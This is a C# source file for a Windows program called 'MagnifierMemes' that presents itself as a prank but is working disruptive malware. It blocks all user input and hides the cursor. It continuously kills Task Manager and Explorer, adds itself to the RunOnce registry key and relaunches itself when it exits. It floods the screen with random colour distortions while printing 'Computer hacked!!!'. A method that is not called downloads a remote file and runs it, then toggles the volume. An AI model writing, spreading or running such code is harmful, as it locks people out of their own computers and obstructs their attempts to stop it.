#region

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using PInvoke;

#endregion

namespace MagnifierMemes
{
    internal class Program
    {
        private const int GWL_STYLE = -16;
        private const int WS_SYSMENU = 0x80000;
        private const bool SMOOTH = true;

        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowSystemCursor(bool fShowCursor);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int BlockInput(bool fBlockIt);

        public static float[,] MoreBlue(float[,] colorMatrix)
        {
            var temp = (float[,]) colorMatrix.Clone();
            temp[2, 4] += 0.1f; //or remove 0.1 off the red
            return temp;
        }

        public static float[,] MoreGreen(float[,] colorMatrix)
        {
            var temp = (float[,]) colorMatrix.Clone();
            temp[1, 4] += 0.1f;
            return temp;
        }

        public static float[,] MoreRed(float[,] colorMatrix)
        {
            var temp = (float[,]) colorMatrix.Clone();
            temp[0, 4] += 0.1f;
            return temp;
        }

        public static float GetRandomNumber(double minimum = -1, double maximum = 1)
        {
            var random = new Random();
            return (float) (random.NextDouble() * (maximum - minimum) + minimum);
        }

        private static void Killer()
        {
            while (true)
            {
                var proc = Process.GetProcessesByName("taskmgr");
                var proc2 = Process.GetProcessesByName("explorer");
                var proc3 = Process.GetProcessesByName("hacker");

                var p = proc.Concat(proc2).Concat(proc3).ToList();

                if (p.Count != 0)
                    foreach (var process in p)
                        try
                        {
                            process.Kill();
                        }
                        catch
                        {
                        }

                Thread.Sleep(10);
            }
        }

        private static void Main(string[] args)
        {
            Protect();
            Setup();
            AutoStart();
            // Music();
            Task.Run(Prank);
            Thread.Sleep(-1);
        }

        private static void AutoStart()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);

                rk.SetValue("Prank", Application.ExecutablePath);
            } catch (Exception e){Console.WriteLine(e);}
        }

        private static void Protect()
        {
            Task.Run(Killer);
        }

        private static void Music()
        {
            try
            {
                var wc = new WebClient();

                wc.DownloadFile(
                    "http://dl147.y2mate.com/?file=M3R4SUNiN3JsOHJ6WWQ2a3NQS1Y5ZGlxVlZIOCtyaGh2SVYvNWpab1JJOGM0OVFPa3NEd1pwQWZhNE5maU5PRFdwdHdwWHVCVjVXdllFclE1dDBDRWphZ3A1TVo2WHFXMXNzRUNZd29CRlBjeTZQNnMzUlMyVUtzS1ozcFJmMFBOVEpmOHdVNjhtM1c2S0dSbUVlOWx5M28vbWpHU0hSUDZ4aE9HYVdWcU04TjhUbU9UcWFoZ2NGT2p3ZXMwZEZyOWQrdWdDVFNqYjh1NjVwelYwaHhUSUJjelpLb21xTHF2RWdNbEl3ZTN3ajJqKysyVmR0bk92UGJLeEZwYkM4SS9lcWhYeFFUaEdoVittMnQ1WkFuNFc4YVphVngxMm1kNEtMZVBtbXFlc0hsQVp5VWVhNjR2dFh3OFB4MXRrekUrN0tSek1nWHhsanpINWk1VmRnU3RCSng4UGJTc3BwbWhFV3ZoeHdNMHc9PQ%3D%3D",
                    "sound.mp3");
                Process.Start("sound.mp3");
            }
            catch
            {
            }

            Task.Run(VolumeUpper);
        }

        private static void Setup()
        {
            Process.GetCurrentProcess().Exited += OnExited;
            AppDomain.CurrentDomain.ProcessExit += OnExited;
            Application.ApplicationExit += OnExited;

            Console.TreatControlCAsInput = true;

            var hwnd = Kernel32.GetConsoleWindow();
            SetWindowLong(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) & ~WS_SYSMENU);

            BlockInput(true);

            Console.WindowTop = 0;
            Console.WindowLeft = 0;

            Console.WindowHeight = 1;
            Console.WindowWidth = 1;

            ShowSystemCursor(false);
        }

        private static void Prank()
        {
            var res = Magnification.MagInitialize();

            if (!res)
            {
                Console.WriteLine("Failed to initialize magnification API");
                Environment.Exit(1);
            }

            var matrices = new List<float[,]>
            {
                new[,]
                {
                    {1.0f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 1.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 1.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {-1.0f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, -1.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, -1.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {0.3f, 0.3f, 0.3f, 0.0f, 0.0f},
                    {0.6f, 0.6f, 0.6f, 0.0f, 0.0f},
                    {0.1f, 0.1f, 0.1f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {1.0f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {.393f, .349f, .272f, 0.0f, 0.0f},
                    {.769f, .686f, .534f, 0.0f, 0.0f},
                    {.189f, .168f, .131f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {-0.3333333f, 0.6666667f, 0.6666667f, 0.0f, 0.0f},
                    {0.6666667f, -0.3333333f, 0.6666667f, 0.0f, 0.0f},
                    {0.6666667f, 0.6666667f, -0.3333333f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {1.0f, -1.0f, -1.0f, 0.0f, 0.0f},
                    {-1.0f, 1.0f, -1.0f, 0.0f, 0.0f},
                    {-1.0f, -1.0f, 1.0f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {0.39f, -0.62f, -0.62f, 0.0f, 0.0f},
                    {-1.21f, -0.22f, -1.22f, 0.0f, 0.0f},
                    {-0.16f, -0.16f, 0.84f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {1.089508f, -0.9326327f, -0.932633042f, 0.0f, 0.0f},
                    {-1.81771779f, 0.1683074f, -1.84169245f, 0.0f, 0.0f},
                    {-0.244589478f, -0.247815639f, 1.7621845f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {0.50f, -0.78f, -0.78f, 0.0f, 0.0f},
                    {-0.56f, 0.72f, -0.56f, 0.0f, 0.0f},
                    {-0.94f, -0.94f, 0.34f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {0.23f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0f, 0.49f, 0.0f, 0.0f, 0.0f},
                    {0f, 0f, 0.96f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {0.56f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0f, 0.89f, 0.0f, 0.0f, 0.0f},
                    {0f, 0f, -0.22f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 0.69f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                },
                new[,]
                {
                    {-0.59f, 0.0f, 0.0f, 0.0f, 0.0f},
                    {0f, -0.30f, 0.0f, 0.0f, 0.0f},
                    {0f, 0f, 0.90f, 0.0f, 0.0f},
                    {0.0f, 0.0f, 0.0f, 1.0f, 0.0f},
                    {1.0f, 1.0f, 1.0f, 0.0f, 1.0f}
                }
            };

            var effect = new Magnification.MAGCOLOREFFECT();

            var random = new Random();

            for (var i = 0; i < int.MaxValue; i++)
            {
                var matr = matrices[random.Next(0, matrices.Count - 1)];

                var t = random.Next(0, 8);

                if (t == 0)
                    matr = MoreBlue(matr);
                else if (t == 1)
                    matr = MoreGreen(matr);
                else if (t == 2)
                    matr = MoreRed(matr);
                else
                    matr = Multiply(matr, matrices[random.Next(0, matrices.Count - 1)]);

                if (!SMOOTH)
                {
                    effect[0, 0] = matr[0, 0];
                    effect[0, 1] = matr[0, 1];
                    effect[0, 2] = matr[0, 2];
                    effect[0, 3] = matr[0, 3];
                    effect[0, 4] = matr[0, 4];
                    effect[1, 0] = matr[1, 0];
                    effect[1, 1] = matr[1, 1];
                    effect[1, 2] = matr[1, 2];
                    effect[1, 3] = matr[1, 3];
                    effect[1, 4] = matr[1, 4];
                    effect[2, 0] = matr[2, 0];
                    effect[2, 1] = matr[2, 1];
                    effect[2, 2] = matr[2, 2];
                    effect[2, 3] = matr[2, 3];
                    effect[2, 4] = matr[2, 4];
                    effect[3, 0] = matr[3, 0];
                    effect[3, 1] = matr[3, 1];
                    effect[3, 2] = matr[3, 2];
                    effect[3, 3] = matr[3, 3];
                    effect[3, 4] = matr[3, 4];
                    effect[4, 0] = matr[4, 0];
                    effect[4, 1] = matr[4, 1];
                    effect[4, 2] = matr[4, 2];
                    effect[4, 3] = matr[4, 3];
                    effect[4, 4] = matr[4, 4];

                    Magnification.MagSetFullscreenColorEffect(effect);
                }

                var transitions = Interpolate(effect, matr);

                foreach (var transition in transitions)
                {
                    Apply(transition);
                    Thread.Sleep(15);
                }

                Console.WriteLine("Computer hacked!!!");
            }
        }

        private static void Apply(float[,] matr)
        {
            var effect = new Magnification.MAGCOLOREFFECT
            {
                [0, 0] = matr[0, 0],
                [0, 1] = matr[0, 1],
                [0, 2] = matr[0, 2],
                [0, 3] = matr[0, 3],
                [0, 4] = matr[0, 4],
                [1, 0] = matr[1, 0],
                [1, 1] = matr[1, 1],
                [1, 2] = matr[1, 2],
                [1, 3] = matr[1, 3],
                [1, 4] = matr[1, 4],
                [2, 0] = matr[2, 0],
                [2, 1] = matr[2, 1],
                [2, 2] = matr[2, 2],
                [2, 3] = matr[2, 3],
                [2, 4] = matr[2, 4],
                [3, 0] = matr[3, 0],
                [3, 1] = matr[3, 1],
                [3, 2] = matr[3, 2],
                [3, 3] = matr[3, 3],
                [3, 4] = matr[3, 4],
                [4, 0] = matr[4, 0],
                [4, 1] = matr[4, 1],
                [4, 2] = matr[4, 2],
                [4, 3] = matr[4, 3],
                [4, 4] = matr[4, 4]
            };


            Magnification.MagSetFullscreenColorEffect(effect);
        }

        private static void VolumeUpper()
        {
            for (var i = 0; i < int.MaxValue; i++)
            {
                VolumeChanger.VolumeUp();
                Thread
                    .Sleep(20);

                VolumeChanger.Mute();
            }
        }

        private static void OnExited(object sender, EventArgs e)
        {
            Process.Start(Process.GetCurrentProcess().StartInfo.FileName);
        }

        public static List<float[,]> Interpolate(Magnification.MAGCOLOREFFECT A, float[,] B)
        {
            const int STEPS = 10;
            const int SIZE = 5;

            var result = new List<float[,]>(STEPS);

            for (var i = 0; i < STEPS; i++)
            {
                result.Add(new float[SIZE, SIZE]);

                for (var x = 0; x < SIZE; x++)
                for (var y = 0; y < SIZE; y++)
                    result[i][x, y] = A[x, y] + (i + 1 /*-0*/) * (B[x, y] - A[x, y]) / STEPS;
            }

            return result;
        }

        public static float[,] Multiply(float[,] a, float[,] b)
        {
            var c = new float[a.GetLength(0), b.GetLength(1)];
            for (var i = 0; i < c.GetLength(0); i++)
            for (var j = 0; j < c.GetLength(1); j++)
            for (var k = 0; k < a.GetLength(1); k++)
                c[i, j] = c[i, j] + a[i, k] * b[k, j];
            return c;
        }
    }
}